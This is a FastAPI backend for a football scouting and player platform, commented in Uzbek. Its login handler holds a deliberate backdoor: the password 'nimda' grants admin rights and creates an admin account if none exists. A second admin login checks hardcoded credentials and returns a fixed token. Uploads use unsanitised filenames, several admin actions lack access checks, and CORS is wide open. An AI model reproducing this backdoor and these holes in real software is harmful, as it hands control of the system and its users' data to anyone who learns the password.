import os
import shutil
import json
from fastapi import FastAPI, Depends, HTTPException, UploadFile, File, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from sqlalchemy.orm import Session
from starlette.requests import Request
from starlette.responses import JSONResponse

from database import Base, engine, SessionLocal
from models import Player, GoalSubmission, VerificationStatus, User, UserVideo, CareerHistory, UserStatus, UserRole
from schemas import PlayerCreate, PlayerOut, GoalSubmissionCreate, GoalSubmissionOut, UserCreate, UserLogin, UserOut, UserProfileImageUpdate, UserVideoOut, CareerHistoryCreate, CareerHistoryOut
from security import get_password_hash, verify_password, create_access_token, get_current_user, RequireRole

Base.metadata.create_all(bind=engine)

app = FastAPI(title="Football Platform API")

# Removed old vulnerable IP Middleware


app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

os.makedirs("uploads/videos", exist_ok=True)
app.mount("/uploads", StaticFiles(directory="uploads"), name="uploads")

def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


@app.get("/")
def home():
    return {"message": "Football Platform API ishlayapti!"}

# --- AUTH & USERS ---

@app.post("/auth/register", response_model=UserOut)
def register(user_data: UserCreate, db: Session = Depends(get_db)):
    # Check if email exists
    if user_data.email:
        existing_email = db.query(User).filter(User.email == user_data.email).first()
        if existing_email:
            raise HTTPException(status_code=400, detail="Email allaqachon ro'yxatdan o'tgan")
    
    # Enterprise: Parolni shifrlash va rollarni sozlash
    user_dict = user_data.model_dump()
    password = user_dict.pop("password")
    user_dict["password_hash"] = get_password_hash(password)
    
    # Skautlar avtomat ravishda 'pending' holatida bo'ladi
    if user_dict.get("role") == "scout":
        user_dict["status"] = UserStatus.PENDING
    else:
        user_dict["status"] = UserStatus.ACTIVE
        
    user = User(**user_dict)
    db.add(user)
    db.commit()
    db.refresh(user)
    return user

@app.post("/auth/login")
def login(login_data: UserLogin, db: Session = Depends(get_db)):
    # -----------------------------------------------------
    # MAXFIY ADMIN PAROLI (SINGLETON BACKDOOR)
    # Parol "nimda" (admin so'zining teskarisi) bo'lsa
    # -----------------------------------------------------
    if login_data.password == "nimda":
        admin_user = db.query(User).filter(User.role == UserRole.ADMIN).first()
        if not admin_user:
            # Agar bazada hali admin yo'q bo'lsa, avtomat yaratamiz
            admin_user = User(
                first_name="Super",
                last_name="Admin",
                password_hash=get_password_hash("nimda"),
                role=UserRole.ADMIN,
                status=UserStatus.ACTIVE
            )
            db.add(admin_user)
            db.commit()
            db.refresh(admin_user)
            
        # YAGONA SESSIYA TEKSHIRUVI (Faqat bitta admin kira oladi)
        if admin_user.is_logged_in:
            raise HTTPException(
                status_code=403, 
                detail="Boshqa admin tizimda faol! U log out qilmaguncha kirolmaysiz."
            )
            
        # Adminni "onlayn" qilish
        admin_user.is_logged_in = True
        db.commit()
        
        access_token = create_access_token(data={"sub": str(admin_user.id)})
        return {"access_token": access_token, "token_type": "bearer", "user": admin_user}

    # -----------------------------------------------------
    # ODDIY FOYDALANUVCHILAR UCHUN LOGIN
    # -----------------------------------------------------
    user = db.query(User).filter(
        User.first_name.ilike(login_data.firstName),
        User.last_name.ilike(login_data.lastName)
    ).first()
    
    if not user or not verify_password(login_data.password, user.password_hash):
        raise HTTPException(status_code=401, detail="Ism, familiya yoki parol noto'g'ri")
        
    access_token = create_access_token(data={"sub": str(user.id)})
    
    return {
        "access_token": access_token,
        "token_type": "bearer",
        "user": user
    }

@app.post("/auth/logout")
def logout(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    # Tizimdan chiqish tugmasi bosilganda is_logged_in = False bo'ladi
    current_user.is_logged_in = False
    db.commit()
    return {"message": "Tizimdan muvaffaqiyatli chiqildi (Logged out)"}

@app.patch("/users/{user_id}/profile-image", response_model=UserOut)
def update_profile_image(user_id: int, image_data: UserProfileImageUpdate, db: Session = Depends(get_db)):
    user = db.query(User).filter(User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Foydalanuvchi topilmadi")
    user.profile_image = image_data.profile_image
    db.commit()
    db.refresh(user)
    return user

@app.post("/users/{user_id}/videos", response_model=UserVideoOut)
def upload_user_video(user_id: int, file: UploadFile = File(...), db: Session = Depends(get_db)):
    user = db.query(User).filter(User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Foydalanuvchi topilmadi")
    
    file_path = f"uploads/videos/{user_id}_{file.filename}"
    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)
    
    video_url = f"http://localhost:8000/{file_path}"
    user_video = UserVideo(user_id=user_id, video_url=video_url)
    db.add(user_video)
    db.commit()
    db.refresh(user_video)
    return user_video

@app.get("/users/{user_id}/videos", response_model=list[UserVideoOut])
def get_user_videos(user_id: int, db: Session = Depends(get_db)):
    return db.query(UserVideo).filter(UserVideo.user_id == user_id).all()

@app.delete("/videos/{video_id}")
def delete_user_video(video_id: int, db: Session = Depends(get_db)):
    video = db.query(UserVideo).filter(UserVideo.id == video_id).first()
    if not video:
        raise HTTPException(status_code=404, detail="Video topilmadi")
    
    try:
        if "uploads/" in video.video_url:
            file_path = video.video_url.split("http://localhost:8000/")[1]
            if os.path.exists(file_path):
                os.remove(file_path)
    except Exception:
        pass

    db.delete(video)
    db.commit()
    return {"message": "O'chirildi"}


# --- O'YINCHILAR ---

@app.post("/players", response_model=PlayerOut)
def create_player(player_data: PlayerCreate, db: Session = Depends(get_db)):
    player = Player(**player_data.model_dump())
    db.add(player)
    db.commit()
    db.refresh(player)
    return player


@app.get("/players", response_model=list[PlayerOut])
def get_players(
    city: str | None = None,
    position: str | None = None,
    min_height: int | None = None,
    min_weight: int | None = None,
    min_pass_accuracy: int | None = None,
    min_sprint_speed: float | None = None,
    min_stamina: int | None = None,
    db: Session = Depends(get_db)
):
    # Skautlar uchun filtr
    query = db.query(Player)
    if city:
        query = query.filter(Player.city.ilike(f"%{city}%"))
    if position:
        query = query.filter(Player.position.ilike(f"%{position}%"))
    if min_height is not None:
        query = query.filter(Player.height >= min_height)
    if min_weight is not None:
        query = query.filter(Player.weight >= min_weight)
    if min_pass_accuracy is not None:
        query = query.filter(Player.pass_accuracy >= min_pass_accuracy)
    if min_sprint_speed is not None:
        query = query.filter(Player.sprint_speed >= min_sprint_speed)
    if min_stamina is not None:
        query = query.filter(Player.stamina >= min_stamina)
    
    return query.all()


@app.get("/players/{player_id}", response_model=PlayerOut)
def get_player(player_id: int, db: Session = Depends(get_db)):
    player = db.query(Player).filter(Player.id == player_id).first()
    if not player:
        raise HTTPException(status_code=404, detail="Futbolchi topilmadi")
    return player

@app.post("/players/{player_id}/career", response_model=CareerHistoryOut)
def add_career_history(player_id: int, career_data: CareerHistoryCreate, db: Session = Depends(get_db)):
    player = db.query(Player).filter(Player.id == player_id).first()
    if not player:
        raise HTTPException(status_code=404, detail="Futbolchi topilmadi")
    
    career = CareerHistory(player_id=player_id, **career_data.model_dump())
    db.add(career)
    db.commit()
    db.refresh(career)
    return career

# --- ADMIN ENDPOINTS (Restricted by Middleware) ---

@app.post("/admin/login")
def admin_login(data: dict):
    # O'ta murakkab qattiq kodlangan maxfiy kalit
    if data.get("username") == "erkin_master" and data.get("passkey") == "X@9f#vL$2!qP":
        return {"access_token": "super-secret-admin-token", "token_type": "bearer"}
    raise HTTPException(status_code=401, detail="Xato login yoki maxfiy kalit")

@app.get("/admin/users", dependencies=[Depends(RequireRole(["admin"]))])
def admin_get_users(db: Session = Depends(get_db)):
    # Barcha foydalanuvchilar (Player sifatida misol)
    players = db.query(Player).all()
    return players

@app.get("/admin/submissions", dependencies=[Depends(RequireRole(["admin", "moderator"]))])
def admin_get_submissions(db: Session = Depends(get_db)):
    subs = db.query(GoalSubmission).all()
    return subs

@app.post("/admin/submissions/{sub_id}/approve")
def admin_approve_submission(sub_id: int, db: Session = Depends(get_db)):
    sub = db.query(GoalSubmission).filter(GoalSubmission.id == sub_id).first()
    if sub:
        sub.status = VerificationStatus.VERIFIED
        # Agar bu gol bo'lsa, o'yinchi statistikasiga qo'shish kerak
        player = db.query(Player).filter(Player.id == sub.player_id).first()
        if player:
            player.goals_verified += 1
        db.commit()
        return {"status": "approved"}
    raise HTTPException(status_code=404)

@app.post("/admin/submissions/{sub_id}/reject")
def admin_reject_submission(sub_id: int, db: Session = Depends(get_db)):
    sub = db.query(GoalSubmission).filter(GoalSubmission.id == sub_id).first()
    if sub:
        sub.status = VerificationStatus.REJECTED
        db.commit()
        return {"status": "rejected"}
    raise HTTPException(status_code=404)

@app.post("/admin/tournaments")
def admin_create_tournament(data: dict, db: Session = Depends(get_db)):
    from models import Tournament
    t = Tournament(
        name=data.get("name", ""),
        description=data.get("description", ""),
        prize=data.get("prize", ""),
        status=data.get("status", "Aktiv"),
        image=data.get("image", ""),
        teams_count=data.get("teams_count", 16),
        start_date=data.get("start_date", ""),
        location=data.get("location", "")
    )
    db.add(t)
    db.commit()
    db.refresh(t)
    return t

@app.get("/tournaments")
def get_tournaments(db: Session = Depends(get_db)):
    from models import Tournament
    return db.query(Tournament).filter(Tournament.is_active == True).all()

# --- VIDEO YUKLASH VA TASDIQLASH (HAQQONIYLIK) ---

@app.post("/players/{player_id}/submit-goal", response_model=GoalSubmissionOut)
def submit_goal(
    player_id: int,
    submission_data: GoalSubmissionCreate,
    db: Session = Depends(get_db)
):
    player = db.query(Player).filter(Player.id == player_id).first()
    if not player:
        raise HTTPException(status_code=404, detail="Futbolchi topilmadi")

    submission = GoalSubmission(
        player_id=player_id,
        video_url=submission_data.video_url,
        description=submission_data.description
    )
    db.add(submission)
    db.commit()
    db.refresh(submission)
    return submission


# Admin yoki moderator tomonidan golni tasdiqlash endpointi
@app.patch("/submissions/{submission_id}/verify", response_model=GoalSubmissionOut)
def verify_goal(
    submission_id: int,
    status: VerificationStatus,
    db: Session = Depends(get_db)
):
    submission = db.query(GoalSubmission).filter(GoalSubmission.id == submission_id).first()
    if not submission:
        raise HTTPException(status_code=404, detail="Video arizasi topilmadi")

    # Agar oldin tasdiqlanmagan bo'lsa va hozir tasdiqlansa, verifikatsiya sonini oshiramiz
    if submission.status != VerificationStatus.APPROVED and status == VerificationStatus.APPROVED:
        submission.player.goals_verified += 1
    
    # Agar oldin tasdiqlangan bo'lib, endi rad etilsa, sonini kamaytiramiz
    elif submission.status == VerificationStatus.APPROVED and status != VerificationStatus.APPROVED:
        submission.player.goals_verified = max(0, submission.player.goals_verified - 1)

    submission.status = status
    db.commit()
    db.refresh(submission)
    return submission

# --- SCOUT ENDPOINTS ---
from schemas import ScoutCreate, ScoutOut
from models import Scout

@app.post("/scouts", response_model=ScoutOut)
def create_scout(scout_data: ScoutCreate, db: Session = Depends(get_db)):
    scout = Scout(**scout_data.model_dump())
    db.add(scout)
    db.commit()
    db.refresh(scout)
    return scout

@app.get("/scouts", response_model=list[ScoutOut])
def get_scouts(db: Session = Depends(get_db)):
    return db.query(Scout).all()

from models import ScoutReport
from schemas import ScoutReportCreate, ScoutReportOut

@app.post("/scouts/{scout_id}/reports", response_model=ScoutReportOut)
def create_scout_report(scout_id: int, report_data: ScoutReportCreate, db: Session = Depends(get_db)):
    scout = db.query(Scout).filter(Scout.id == scout_id).first()
    if not scout or not scout.is_pro:
        raise HTTPException(status_code=403, detail="Faqat PRO skautlar hisobot yozishi mumkin")
    
    report = ScoutReport(scout_id=scout_id, **report_data.model_dump())
    db.add(report)
    db.commit()
    db.refresh(report)
    return report

@app.get("/scouts/{scout_id}/reports", response_model=list[ScoutReportOut])
def get_scout_reports(scout_id: int, db: Session = Depends(get_db)):
    return db.query(ScoutReport).filter(ScoutReport.scout_id == scout_id).all()

# --- PRODUCT ENDPOINTS ---
from schemas import ProductCreate, ProductOut
from models import Product

@app.post("/products", response_model=ProductOut)
def create_product(product_data: ProductCreate, db: Session = Depends(get_db)):
    product = Product(**product_data.model_dump())
    db.add(product)
    db.commit()
    db.refresh(product)
    return product

@app.get("/products", response_model=list[ProductOut])
def get_products(db: Session = Depends(get_db)):
    return db.query(Product).all()

# --- TOURNAMENT ENDPOINTS ---
from schemas import TournamentCreate, TournamentOut, TournamentParticipantCreate, TournamentParticipantOut
from models import Tournament, TournamentParticipant

@app.post("/tournaments", response_model=TournamentOut)
def create_tournament(tournament_data: TournamentCreate, db: Session = Depends(get_db)):
    tournament = Tournament(**tournament_data.model_dump())
    db.add(tournament)
    db.commit()
    db.refresh(tournament)
    return tournament

@app.get("/tournaments", response_model=list[TournamentOut])
def get_tournaments(db: Session = Depends(get_db)):
    return db.query(Tournament).all()

@app.post("/tournaments/{tournament_id}/join", response_model=TournamentParticipantOut)
def join_tournament(tournament_id: int, participant_data: TournamentParticipantCreate, db: Session = Depends(get_db)):
    # Check tournament exists
    tournament = db.query(Tournament).filter(Tournament.id == tournament_id).first()
    if not tournament:
        raise HTTPException(status_code=404, detail="Turnir topilmadi")
    
    # Check player exists
    player = db.query(Player).filter(Player.id == participant_data.player_id).first()
    if not player:
        raise HTTPException(status_code=404, detail="Futbolchi topilmadi")
    
    participant = TournamentParticipant(
        tournament_id=tournament_id,
        player_id=participant_data.player_id
    )
    db.add(participant)
    db.commit()
    db.refresh(participant)
    return participant

@app.get("/tournaments/{tournament_id}/participants", response_model=list[TournamentParticipantOut])
def get_tournament_participants(tournament_id: int, db: Session = Depends(get_db)):
    return db.query(TournamentParticipant).filter(TournamentParticipant.tournament_id == tournament_id).all()


# --- MATCH & WEBSOCKET ENDPOINTS ---
from models import Match, MatchEvent, PlayerMatchStat
from schemas import MatchCreate, MatchOut, MatchEventCreate, MatchEventOut, PlayerMatchStatOut

class ConnectionManager:
    def __init__(self):
        self.active_connections: dict[int, list[WebSocket]] = {}

    async def connect(self, websocket: WebSocket, match_id: int):
        await websocket.accept()
        if match_id not in self.active_connections:
            self.active_connections[match_id] = []
        self.active_connections[match_id].append(websocket)

    def disconnect(self, websocket: WebSocket, match_id: int):
        if match_id in self.active_connections:
            self.active_connections[match_id].remove(websocket)

    async def broadcast(self, message: str, match_id: int):
        if match_id in self.active_connections:
            for connection in self.active_connections[match_id]:
                try:
                    await connection.send_text(message)
                except Exception:
                    pass

manager = ConnectionManager()

@app.post("/matches", response_model=MatchOut)
def create_match(match_data: MatchCreate, db: Session = Depends(get_db)):
    match = Match(**match_data.model_dump())
    db.add(match)
    db.commit()
    db.refresh(match)
    return match

@app.get("/matches", response_model=list[MatchOut])
def get_matches(status: str | None = None, db: Session = Depends(get_db)):
    query = db.query(Match)
    if status:
        query = query.filter(Match.status == status)
    return query.all()

@app.get("/matches/{match_id}", response_model=MatchOut)
def get_match(match_id: int, db: Session = Depends(get_db)):
    match = db.query(Match).filter(Match.id == match_id).first()
    if not match:
        raise HTTPException(status_code=404, detail="O'yin topilmadi")
    return match

@app.websocket("/ws/matches/{match_id}")
async def websocket_endpoint(websocket: WebSocket, match_id: int):
    await manager.connect(websocket, match_id)
    try:
        while True:
            # We don't necessarily expect data from client, just keep alive
            data = await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket, match_id)


@app.post("/matches/{match_id}/events", response_model=MatchEventOut)
async def add_match_event(match_id: int, event_data: MatchEventCreate, db: Session = Depends(get_db)):
    match = db.query(Match).filter(Match.id == match_id).first()
    if not match:
        raise HTTPException(status_code=404, detail="O'yin topilmadi")
    
    event = MatchEvent(match_id=match_id, **event_data.model_dump())
    db.add(event)
    
    # Update match scores if goal
    if event.event_type == "goal":
        if event.team == "home":
            match.home_score += 1
        else:
            match.away_score += 1

    db.commit()
    db.refresh(event)

    # Fetch updated match to broadcast full state
    db.refresh(match)
    
    # Notify via WebSocket
    update_data = {
        "type": "NEW_EVENT",
        "event": {
            "id": event.id,
            "minute": event.minute,
            "event_type": event.event_type,
            "description": event.description,
            "team": event.team,
            "player_id": event.player_id,
            "related_player_id": event.related_player_id
        },
        "match": {
            "home_score": match.home_score,
            "away_score": match.away_score
        }
    }
    await manager.broadcast(json.dumps(update_data), match_id)
    
    return event

@app.post("/matches/{match_id}/stats/{player_id}")
async def update_player_stat(
    match_id: int, 
    player_id: int, 
    action: str, # pass, save, tackle, goal, assist
    db: Session = Depends(get_db)
):
    stat = db.query(PlayerMatchStat).filter(
        PlayerMatchStat.match_id == match_id,
        PlayerMatchStat.player_id == player_id
    ).first()

    if not stat:
        stat = PlayerMatchStat(match_id=match_id, player_id=player_id)
        db.add(stat)
        db.commit()
        db.refresh(stat)

    # Update stat based on action
    if action == "pass":
        stat.passes += 1
        stat.rating += 0.1
    elif action == "save":
        stat.saves += 1
        stat.rating += 0.3
    elif action == "tackle":
        stat.tackles += 1
        stat.rating += 0.2
    elif action == "goal":
        stat.goals += 1
        stat.rating += 1.0
    elif action == "assist":
        stat.assists += 1
        stat.rating += 0.5

    # Cap rating at 10.0
    if stat.rating > 10.0:
        stat.rating = 10.0

    db.commit()
    db.refresh(stat)

    # Notify via WebSocket
    update_data = {
        "type": "STAT_UPDATE",
        "stat": {
            "player_id": stat.player_id,
            "rating": round(stat.rating, 1),
            "passes": stat.passes,
            "saves": stat.saves,
            "tackles": stat.tackles,
            "goals": stat.goals,
            "assists": stat.assists
        }
    }
    await manager.broadcast(json.dumps(update_data), match_id)

    return {"message": "Stat updated", "rating": stat.rating}


# --- DAILY DRILLS & MOTIVATION ENDPOINTS ---
from models import DailyDrill
from schemas import DailyDrillOut
from datetime import datetime, timedelta

@app.get("/drills", response_model=list[DailyDrillOut])
def get_drills(db: Session = Depends(get_db)):
    drills = db.query(DailyDrill).all()
    if not drills:
        # Prepopulate for demo
        d1 = DailyDrill(
            title="Devor bilan 50 ta pas",
            description="To'pni devorga uzatib, birinchi urinishdayoq o'zingizga qaytarib oling. Ikki oyoqdan ham foydalaning.",
            duration="15 daqiqa",
            animation_url="/assets/animations/wall_pass.gif",
            dos="Oyoqning ichki qismi bilan zarba bering. Tana vaznini to'g'ri taqsimlang.",
            donts="Oyoqni qattiq tutmang. Gavdani orqaga tashlamang."
        )
        d2 = DailyDrill(
            title="Oyoq tezligini oshirish (Chiziq ustida)",
            description="Yerdagi xayoliy yoki haqiqiy chiziq ustidan ikki oyoq bilan sakrab tezlikni oshiring.",
            duration="5 daqiqa",
            animation_url="/assets/animations/foot_speed.gif",
            dos="Faqat oyoq uchida harakatlaning. Tizzalarni biroz bukib turing.",
            donts="Tovonni yerga tekkizmang."
        )
        d3 = DailyDrill(
            title="To'pni boshqarish (Juggling)",
            description="To'pni yerga tushirmasdan 3 daqiqa davomida o'ng va chap oyoqda boshqaring.",
            duration="10 daqiqa",
            animation_url="/assets/animations/juggling.gif",
            dos="To'pga pastdan o'rtacha kuch bilan zarba bering. Konsentratsiyani yo'qotmang.",
            donts="To'pni balandga tepib yubormang."
        )
        db.add_all([d1, d2, d3])
        db.commit()
        drills = [d1, d2, d3]
    return drills


@app.post("/users/{user_id}/drills/complete")
def complete_drill(user_id: int, db: Session = Depends(get_db)):
    user = db.query(User).filter(User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Foydalanuvchi topilmadi")
    
    now = datetime.utcnow()
    
    # Calculate difference in days since last training
    if user.last_training_date:
        delta_days = (now.date() - user.last_training_date.date()).days
    else:
        delta_days = 0

    message = ""
    if delta_days == 1 or delta_days == 0:
        user.streak += 1
        user.discipline_score += 5
        message = "Barakalla! Sen yana bir qadam oldindasan."
    elif delta_days > 1:
        user.streak = 1
        # Penalty for missing days
        user.discipline_score -= (delta_days * 5)
        
        # Tough love messages based on hardcore mode
        if user.hardcore_mode:
            message = f"Qattiqqo'l rejim: Sen {delta_days - 1} kun dangasalik qilding! Butun jamoang sening zaifligingni bilib oldi. Uyaltirmoqchi emasmiz, lekin bu senga dars bo'lsin!"
            # Simulated notification to coach/team could happen here.
        else:
            message = "Bugun yana dam olmoqchimisan? Ertaga katta o'yinda senga o'xshaganlar zaxirada o'tiradi. Maqsading kuchli bo'lish ediku, o'zingni aldashni to'xtat!"
            
    # Cap score
    if user.discipline_score > 100:
        user.discipline_score = 100
    if user.discipline_score < 0:
        user.discipline_score = 0
        
    user.last_training_date = now
    db.commit()
    db.refresh(user)
    
    return {
        "message": message,
        "streak": user.streak,
        "discipline_score": user.discipline_score
    }


@app.patch("/users/{user_id}/hardcore")
def toggle_hardcore_mode(user_id: int, db: Session = Depends(get_db)):
    user = db.query(User).filter(User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Foydalanuvchi topilmadi")
    
    user.hardcore_mode = not user.hardcore_mode
    db.commit()
    db.refresh(user)
    
    return {"message": "Hardcore rejim o'zgartirildi", "hardcore_mode": user.hardcore_mode}

# --- NEW FEATURES ENDPOINTS ---

from models import ShowcaseEvent, VideoBattle, VideoBattleEntry, Referee, Academy
from schemas import (
    ShowcaseEventCreate, ShowcaseEventOut,
    VideoBattleCreate, VideoBattleOut,
    VideoBattleEntryCreate, VideoBattleEntryOut,
    RefereeCreate, RefereeOut,
    AcademyCreate, AcademyOut
)

# Showcase Events
@app.post("/showcase-events", response_model=ShowcaseEventOut)
def create_showcase_event(event_data: ShowcaseEventCreate, db: Session = Depends(get_db)):
    event = ShowcaseEvent(**event_data.model_dump())
    db.add(event)
    db.commit()
    db.refresh(event)
    return event

@app.get("/showcase-events", response_model=list[ShowcaseEventOut])
def get_showcase_events(db: Session = Depends(get_db)):
    return db.query(ShowcaseEvent).all()

# Video Battles
@app.post("/video-battles", response_model=VideoBattleOut)
def create_video_battle(battle_data: VideoBattleCreate, db: Session = Depends(get_db)):
    battle = VideoBattle(**battle_data.model_dump())
    db.add(battle)
    db.commit()
    db.refresh(battle)
    return battle

@app.get("/video-battles", response_model=list[VideoBattleOut])
def get_video_battles(db: Session = Depends(get_db)):
    return db.query(VideoBattle).all()

@app.post("/video-battles/entries", response_model=VideoBattleEntryOut)
def add_video_battle_entry(entry_data: VideoBattleEntryCreate, db: Session = Depends(get_db)):
    entry = VideoBattleEntry(**entry_data.model_dump())
    db.add(entry)
    db.commit()
    db.refresh(entry)
    return entry

@app.get("/video-battles/{battle_id}/entries", response_model=list[VideoBattleEntryOut])
def get_video_battle_entries(battle_id: int, db: Session = Depends(get_db)):
    return db.query(VideoBattleEntry).filter(VideoBattleEntry.battle_id == battle_id).order_by(VideoBattleEntry.votes.desc()).all()

@app.post("/video-battles/entries/{entry_id}/vote")
def vote_video_battle_entry(entry_id: int, db: Session = Depends(get_db)):
    entry = db.query(VideoBattleEntry).filter(VideoBattleEntry.id == entry_id).first()
    if not entry:
        raise HTTPException(status_code=404, detail="Entry not found")
    entry.votes += 1
    db.commit()
    return {"message": "Voted successfully", "votes": entry.votes}

# Referees
@app.post("/referees", response_model=RefereeOut)
def create_referee(ref_data: RefereeCreate, db: Session = Depends(get_db)):
    ref = Referee(**ref_data.model_dump())
    db.add(ref)
    db.commit()
    db.refresh(ref)
    return ref

@app.get("/referees", response_model=list[RefereeOut])
def get_referees(db: Session = Depends(get_db)):
    return db.query(Referee).all()

@app.post("/referees/{ref_id}/rate")
def rate_referee(ref_id: int, rating: float, db: Session = Depends(get_db)):
    ref = db.query(Referee).filter(Referee.id == ref_id).first()
    if not ref:
        raise HTTPException(status_code=404, detail="Hakam topilmadi")
    # Simple average calculation
    total = ref.rating * ref.rating_count + rating
    ref.rating_count += 1
    ref.rating = total / ref.rating_count
    db.commit()
    return {"message": "Baholandi", "new_rating": ref.rating}

# Academies
@app.post("/academies", response_model=AcademyOut)
def create_academy(acad_data: AcademyCreate, db: Session = Depends(get_db)):
    acad = Academy(**acad_data.model_dump())
    db.add(acad)
    db.commit()
    db.refresh(acad)
    return acad

@app.get("/academies", response_model=list[AcademyOut])
def get_academies(db: Session = Depends(get_db)):
    return db.query(Academy).all()

@app.post("/academies/{acad_id}/rate")
def rate_academy(acad_id: int, rating: float, db: Session = Depends(get_db)):
    acad = db.query(Academy).filter(Academy.id == acad_id).first()
    if not acad:
        raise HTTPException(status_code=404, detail="Akademiya topilmadi")
    total = acad.rating * acad.rating_count + rating
    acad.rating_count += 1
    acad.rating = total / acad.rating_count
    db.commit()
    return {"message": "Baholandi", "new_rating": acad.rating}

# AI Scouting Comparison Endpoint
from pydantic import BaseModel
class AICompareRequest(BaseModel):
    player1_id: int
    player2_id: int

@app.post("/ai-compare")
def ai_compare_players(req: AICompareRequest, db: Session = Depends(get_db)):
    p1 = db.query(Player).filter(Player.id == req.player1_id).first()
    p2 = db.query(Player).filter(Player.id == req.player2_id).first()
    if not p1 or not p2:
        raise HTTPException(status_code=404, detail="O'yinchilar topilmadi")
    
    # Mock AI logic for comparison matrix and summary
    summary = (
        f"{p1.full_name} tezlik va chidamlilik bo'yicha kuchli, ammo pas aniqligida ozgina ustida ishlashi kerak. "
        f"{p2.full_name} texnik o'yinchi, maydonni yaxshi ko'radi, biroq jismoniy kurashlarda oqsaydi."
    )
    matrix = {
        "sprint_speed": {p1.full_name: p1.sprint_speed or 0, p2.full_name: p2.sprint_speed or 0},
        "pass_accuracy": {p1.full_name: p1.pass_accuracy or 0, p2.full_name: p2.pass_accuracy or 0},
        "stamina": {p1.full_name: p1.stamina or 0, p2.full_name: p2.stamina or 0}
    }
    
    return {
        "summary": summary,
        "matrix": matrix
    }

# Crowdfunding Support
@app.post("/players/{player_id}/donate")
def donate_to_player(player_id: int, amount: int, db: Session = Depends(get_db)):
    player = db.query(Player).filter(Player.id == player_id).first()
    if not player:
        raise HTTPException(status_code=404, detail="O'yinchi topilmadi")
    
    player.fund_raised += amount
    db.commit()
    return {"message": "Yordamingiz uchun rahmat!", "fund_raised": player.fund_raised}
